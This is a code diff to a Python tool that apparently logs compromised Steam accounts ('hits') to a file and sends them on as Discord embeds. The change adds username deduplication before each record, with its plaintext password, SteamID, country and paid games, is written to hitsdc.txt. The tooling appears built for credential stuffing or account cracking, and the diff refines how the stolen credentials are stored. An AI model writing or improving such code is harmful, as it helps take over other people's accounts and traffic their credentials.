@@ -86,11 +86,28 @@ def _get_game_banner_url(paid_game_names: list) -> str:
     return ""
 
 
-def _save_to_hitsdc(item: Dict[str, Any], paid_games: List[str]) -> None:
-    """Appends a dispatched hit record to hitsdc.txt on disk."""
+# Track saved usernames to avoid writing duplicates into hitsdc.txt
+_SAVED_DC_ACCOUNTS = set()
+if HITSDC_FILE.exists():
     try:
+        for _l in HITSDC_FILE.open("r", encoding="utf-8", errors="ignore"):
+            if _l.strip() and ":" in _l:
+                _SAVED_DC_ACCOUNTS.add(_l.split(":", 1)[0].strip().lower())
+    except Exception:
+        pass
+
+
+def _save_to_hitsdc(item: Dict[str, Any], paid_games: List[str]) -> None:
+    """Appends a dispatched hit record to hitsdc.txt on disk with deduplication."""
+    try:
+        username = item.get("username", "").strip()
+        if not username:
+            return
+        if username.lower() in _SAVED_DC_ACCOUNTS:
+            return
+        _SAVED_DC_ACCOUNTS.add(username.lower())
+
         HITSDC_FILE.parent.mkdir(parents=True, exist_ok=True)
-        username = item.get("username", "")
         password = item.get("password", "")
         steamid  = item.get("steamid", "")
         country  = item.get("country", "")
@@ -107,6 +124,7 @@ def _save_to_hitsdc(item: Dict[str, Any], paid_games: List[str]) -> None:
             f.write(line)
     except Exception as e:
         logger.debug(f"hitsdc.txt write error: {e}")
+
 
 
 def build_discord_embed(item: Dict[str, Any]) -> tuple:
